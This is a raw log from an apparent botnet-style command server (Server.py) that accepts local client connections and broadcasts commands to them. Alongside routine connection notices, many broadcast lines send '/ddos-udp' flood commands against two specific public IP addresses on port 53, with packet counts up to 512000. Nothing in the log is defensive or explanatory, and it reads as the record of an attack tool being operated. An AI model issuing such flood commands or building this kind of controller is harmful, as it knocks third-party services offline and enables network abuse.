2023-10-20 00:25:09,000 | root | DEBUG | Console.Thread $Start |(Server.py:112)
2023-10-20 00:25:32,606 | root | INFO | New connection <('127.0.0.1', 52534)>:S85 |(Server.py:64)
2023-10-20 00:25:32,606 | root | INFO | new Thread ('127.0.0.1', 52534) |(Server.py:129)
2023-10-20 00:28:30,032 | root | INFO | New connection <('127.0.0.1', 52553)>:S85 |(Server.py:64)
2023-10-20 00:28:30,032 | root | INFO | new Thread ('127.0.0.1', 52553) |(Server.py:129)
2023-10-20 00:29:31,109 | root | INFO | New connection <('127.0.0.1', 52559)>:S85 |(Server.py:64)
2023-10-20 00:29:31,109 | root | INFO | new Thread ('127.0.0.1', 52559) |(Server.py:129)
2023-10-20 00:30:16,898 | root | INFO | New connection <('127.0.0.1', 52568)>:S85 |(Server.py:64)
2023-10-20 00:30:16,898 | root | INFO | new Thread ('127.0.0.1', 52568) |(Server.py:129)
2023-10-20 00:30:31,757 | root | INFO | New connection <('127.0.0.1', 52573)>:S85 |(Server.py:64)
2023-10-20 00:30:31,757 | root | INFO | new Thread ('127.0.0.1', 52573) |(Server.py:129)
2023-10-20 00:31:09,543 | root | INFO | New connection <('127.0.0.1', 52576)>:S85 |(Server.py:64)
2023-10-20 00:31:09,543 | root | INFO | new Thread ('127.0.0.1', 52576) |(Server.py:129)
2023-10-20 00:31:48,612 | root | INFO | New connection <('127.0.0.1', 52582)>:S85 |(Server.py:64)
2023-10-20 00:31:48,612 | root | INFO | new Thread ('127.0.0.1', 52582) |(Server.py:129)
2023-10-20 00:32:12,412 | root | INFO | [/Broadcast] (/1) |(Server.py:164)
2023-10-20 00:32:16,951 | root | INFO | [/Broadcast] (/`12) |(Server.py:164)
2023-10-20 00:32:20,694 | root | INFO | [/Broadcast] (/111) |(Server.py:164)
2023-10-20 00:33:47,011 | root | DEBUG | Console.Thread $Start |(Server.py:86)
2023-10-20 00:34:03,349 | root | INFO | New connection <('127.0.0.1', 52602)>:S85 |(Server.py:58)
2023-10-20 00:34:03,349 | root | INFO | new Thread ('127.0.0.1', 52602) |(Server.py:103)
2023-10-20 00:34:09,349 | root | INFO | [/Broadcast] (/msg) |(Server.py:136)
2023-10-20 00:34:10,431 | root | WARNING | [Unknown input](.sd) |(Server.py:195)
2023-10-20 00:34:12,575 | root | INFO | [/Broadcast] (/asd) |(Server.py:136)
2023-10-20 00:34:50,500 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 512000) |(Server.py:136)
2023-10-20 00:37:38,715 | root | INFO | New connection <('127.0.0.1', 52688)>:S85 |(Server.py:58)
2023-10-20 00:37:38,715 | root | INFO | new Thread ('127.0.0.1', 52688) |(Server.py:103)
2023-10-20 00:37:39,715 | root | INFO | New connection <('127.0.0.1', 52691)>:S85 |(Server.py:58)
2023-10-20 00:37:39,715 | root | INFO | new Thread ('127.0.0.1', 52691) |(Server.py:103)
2023-10-20 00:37:43,045 | root | INFO | New connection <('127.0.0.1', 52693)>:S85 |(Server.py:58)
2023-10-20 00:37:43,045 | root | INFO | new Thread ('127.0.0.1', 52693) |(Server.py:103)
2023-10-20 00:37:44,357 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 512000) |(Server.py:136)
2023-10-20 00:38:44,995 | root | DEBUG | Console.Thread $Start |(Server.py:86)
2023-10-20 00:38:54,219 | root | INFO | New connection <('127.0.0.1', 52724)>:S85 |(Server.py:58)
2023-10-20 00:38:54,219 | root | INFO | new Thread ('127.0.0.1', 52724) |(Server.py:103)
2023-10-20 00:38:55,460 | root | INFO | New connection <('127.0.0.1', 52726)>:S85 |(Server.py:58)
2023-10-20 00:38:55,460 | root | INFO | new Thread ('127.0.0.1', 52726) |(Server.py:103)
2023-10-20 00:38:56,929 | root | INFO | New connection <('127.0.0.1', 52729)>:S85 |(Server.py:58)
2023-10-20 00:38:56,929 | root | INFO | new Thread ('127.0.0.1', 52729) |(Server.py:103)
2023-10-20 00:38:58,014 | root | INFO | New connection <('127.0.0.1', 52731)>:S85 |(Server.py:58)
2023-10-20 00:38:58,014 | root | INFO | new Thread ('127.0.0.1', 52731) |(Server.py:103)
2023-10-20 00:39:39,202 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 12000) |(Server.py:136)
2023-10-20 00:40:14,080 | root | INFO | New connection <('127.0.0.1', 52761)>:S85 |(Server.py:58)
2023-10-20 00:40:14,080 | root | INFO | new Thread ('127.0.0.1', 52761) |(Server.py:103)
2023-10-20 00:40:15,043 | root | INFO | New connection <('127.0.0.1', 52764)>:S85 |(Server.py:58)
2023-10-20 00:40:15,043 | root | INFO | new Thread ('127.0.0.1', 52764) |(Server.py:103)
2023-10-20 00:40:16,695 | root | INFO | New connection <('127.0.0.1', 52766)>:S85 |(Server.py:58)
2023-10-20 00:40:16,695 | root | INFO | new Thread ('127.0.0.1', 52766) |(Server.py:103)
2023-10-20 00:40:17,860 | root | INFO | New connection <('127.0.0.1', 52768)>:S85 |(Server.py:58)
2023-10-20 00:40:17,860 | root | INFO | new Thread ('127.0.0.1', 52768) |(Server.py:103)
2023-10-20 00:40:31,324 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 128000) |(Server.py:136)
2023-10-20 00:41:44,336 | root | INFO | New connection <('127.0.0.1', 52807)>:S85 |(Server.py:58)
2023-10-20 00:41:44,336 | root | INFO | new Thread ('127.0.0.1', 52807) |(Server.py:103)
2023-10-20 00:41:50,714 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 128000) |(Server.py:136)
2023-10-20 00:42:30,452 | root | INFO | New connection <('127.0.0.1', 52819)>:S85 |(Server.py:58)
2023-10-20 00:42:30,452 | root | INFO | new Thread ('127.0.0.1', 52819) |(Server.py:103)
2023-10-20 00:42:33,269 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 128000) |(Server.py:136)
2023-10-20 00:43:49,407 | root | INFO | New connection <('127.0.0.1', 52848)>:S85 |(Server.py:58)
2023-10-20 00:43:49,407 | root | INFO | new Thread ('127.0.0.1', 52848) |(Server.py:103)
2023-10-20 00:44:00,949 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 128000) |(Server.py:136)
2023-10-20 00:45:53,135 | root | INFO | New connection <('127.0.0.1', 52895)>:S85 |(Server.py:58)
2023-10-20 00:45:53,135 | root | INFO | new Thread ('127.0.0.1', 52895) |(Server.py:103)
2023-10-20 00:45:55,891 | root | INFO | [/Broadcast] (/ddos-udp 89.185.85.62 53 -c 128000) |(Server.py:136)
2023-10-20 01:16:00,915 | root | DEBUG | Console.Thread $Start |(Server.py:86)
2023-10-20 01:51:17,002 | root | DEBUG | Console.Thread $Start |(Server.py:91)
2023-10-20 02:02:35,518 | root | INFO | New connection <('127.0.0.1', 54998)>:S85 |(Server.py:63)
2023-10-20 02:02:35,518 | root | INFO | new Thread ('127.0.0.1', 54998) |(Server.py:108)
2023-10-20 02:03:06,760 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 32000) |(Server.py:141)
2023-10-20 02:05:34,898 | root | DEBUG | Console.Thread $Start |(Server.py:91)
2023-10-20 02:05:37,813 | root | INFO | New connection <('127.0.0.1', 55086)>:S85 |(Server.py:63)
2023-10-20 02:05:37,813 | root | INFO | new Thread ('127.0.0.1', 55086) |(Server.py:108)
2023-10-20 02:06:02,236 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 1000) |(Server.py:143)
2023-10-20 02:07:15,807 | root | DEBUG | Console.Thread $Start |(Server.py:91)
2023-10-20 02:07:17,278 | root | INFO | New connection <('127.0.0.1', 55122)>:S85 |(Server.py:63)
2023-10-20 02:07:17,278 | root | INFO | new Thread ('127.0.0.1', 55122) |(Server.py:108)
2023-10-20 02:08:24,808 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 124000) |(Server.py:143)
2023-10-20 02:10:04,567 | root | DEBUG | Console.Thread $Start |(Server.py:91)
2023-10-20 02:10:06,027 | root | INFO | New connection <('127.0.0.1', 55188)>:S85 |(Server.py:63)
2023-10-20 02:10:06,028 | root | INFO | new Thread ('127.0.0.1', 55188) |(Server.py:108)
2023-10-20 02:10:58,687 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 10 ) |(Server.py:143)
2023-10-20 02:12:04,046 | root | DEBUG | Console.Thread $Start |(Server.py:91)
2023-10-20 02:12:05,665 | root | INFO | New connection <('127.0.0.1', 55238)>:S85 |(Server.py:63)
2023-10-20 02:12:05,665 | root | INFO | new Thread ('127.0.0.1', 55238) |(Server.py:108)
2023-10-20 02:17:48,091 | root | INFO | [/Broadcast] (/ddos-udp 79.137.206.198 53 -c 3) |(Server.py:143)
2023-10-20 02:19:38,338 | root | DEBUG | Console.Thread $Start |(Server.py:91)
